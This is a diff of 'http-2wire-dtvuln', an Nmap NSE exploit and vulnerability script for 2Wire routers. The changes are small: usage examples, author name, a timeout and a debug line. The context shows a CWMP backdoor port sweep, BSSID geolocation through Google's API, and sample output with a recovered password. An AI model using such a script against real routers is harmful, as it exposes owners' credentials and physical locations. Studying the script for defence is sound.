@@ -14,15 +14,7 @@ Referencia: http://osvdb.org/88903
 -- @usage
 -- nmap --script http-2wire-dtvuln -p 8080 <target>
 -- @usage
--- nmap --script +http-2wire-dtvuln -p 80 <target>
--- @usage
--- nmap --script http-2wire-dtvuln -p 2000-2999,8080 -n -T4 <target>
--- @usage
--- nmap --script +http-2wire-dtvuln -p 2000-2999 -n -T4 -d -v --open -oA <archivout> -PS8080 <target>
--- @usage
--- nmap --script +http-2wire-dtvuln -p 2000-2999 -n -T4 -dd -vv --open -oA <archivout> -iL <file> -Pn
--- @usage
--- nmap --script http-2wire-dtvuln --script-args h2d.short,h2d.geoapikey=<key> -p 8080 <target>
+-- nmap --script http-2wire-dtvuln --script-args h2d.geoapikey=<key> -p 8080 <target>
 -- @args h2d.htout HTTP Timeout
 -- @args h2d.stout Sockets Timeout
 -- @args h2d.geoapikey API KEY de Google Maps Geolocation
@@ -53,7 +45,7 @@ Referencia: http://osvdb.org/88903
 -- |     rma: 7Fh34#sd
 -- |_  vuln_ip_port: 192.168.1.254:80
 
-author = "Abraham Diaz E. (@adiaz_32)"
+author = "Abraham Diaz (@adiaz_32)"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
 categories = {"exploit","vuln"}
 
@@ -109,7 +101,7 @@ local function cwmp_backdoor (host)
 	--Escaneo propio del script. Util cuando no se especifica de inicio un rango 2000-2999
 	local status, codigo
 	local socket = nmap.new_socket()
-	socket:set_timeout(stout or 1500)
+	socket:set_timeout(stout or 1000)
 	test_port = 2000
 	stdnse.print_debug(1,"%s B - %s Empieza escaneo de puertos 2xxx",SCRIPT_NAME,host.ip)
 	while test_port < 3000 do
@@ -212,7 +204,6 @@ local function geoloc (bssid,otros)
 	end
 	stdnse.print_debug(2,"%s dd geo path = %s",SCRIPT_NAME,geo_path)
 	stdnse.print_debug(2,"%s dd geo objeto = %s",SCRIPT_NAME,nsedebug.tostr(geo_tabla))
-	stdnse.print_debug(2,"%s dd geo to json = %s",SCRIPT_NAME,json.generate(geo_tabla))
 	
 	local resp = http.post(geo_host,443,geo_path,{header={["Content-Type"]="application/json",["Host"]=geo_host}},nil,json.generate(geo_tabla))
 	stdnse.print_debug(2,"%s dd geo response = %s",SCRIPT_NAME,nsedebug.tostr(resp))
